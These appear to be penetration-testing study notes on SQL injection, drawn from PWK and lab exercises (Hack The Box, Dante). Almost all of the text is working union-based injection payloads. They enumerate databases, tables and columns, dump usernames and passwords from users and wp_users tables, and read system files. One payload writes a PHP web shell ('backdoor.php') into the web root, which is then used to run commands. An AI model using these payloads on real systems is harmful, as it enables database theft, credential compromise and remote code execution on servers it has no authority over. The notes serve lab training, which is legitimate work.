#### PWK example
First get out error with single quote
`/debug.php?id='`
Then use "order by" to find all columns.  Keep increasing until you have an error!  If error occurs on 4, then you have 3 columns!
```
/debug.php?id=1 order by 1,2,3
```
Next, we use UNION to discover which columns are being displayed in the page:
```
/debug.php?id=1 union all select 1, 2, 3
```
We will target #3, as it seems to have the most space available.
```
/debug.php?id=1 union all select 1, 2, @@version
```
```
/debug.php?id=1 union all select 1, 2, user()
```
Enumerate DB tables and column structures:
```
/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
```
Target users table and retrieve the column names:
```
/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
```
Extract usernames and passwords:
```
/debug.php?id=1 union all select 1, username, password from users
```
#### Reading files
```
/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```
Notice when we have an error, we get the whole file path.
We can use this info to craft a malicious php file and place it into the root web directory.
```
/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
While we do get an error message, the file did get created and works just fine:
```
/backdoor.php?cmd=ipconfig
```
#### HTB control
https://0xdf.gitlab.io/2020/04/25/htb-control.html
Example from Dante:
```
http://172.16.1.12/blog/single.php?id='
```
The above threw an error:
>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
We append some known tricks to break out the syntax:
	* If nothing happens here, just continue on to UNION statements!
```
http://172.16.1.12/blog/single.php?id=' -- -
```
We then build up the UNION statement, starting at 1, until the web page renders properly again.  Also, we can see some of the numbers on screen, we can pick which entry is good for our details next.
```
' UNION select 1,2,3,4,5,6,7,8,9-- -
```
Find the version of MariaDB:
```
' UNION select 1,version(),3,4,5,6,7,8,9-- -
```
10.4.13-MariaDB
Retrieve Database name:
```
' UNION select 1,database(),3,4,5,6,7,8,9-- -
```
blog_admin_db
Current user:
```
' UNION select 1,user(),3,4,5,6,7,8,9-- -
```
datadir:
```
' UNION select 1,@@datadir,3,4,5,6,7,8,9-- -
```
List the tables
```SQL
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]
```
List the column names of the wp_users table
```SQL
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name'wp_users'#"]
```
Found users & passwords to dump.  Start with users
```SQL
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"]
```
Then Passwords
```SQL
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"]
```
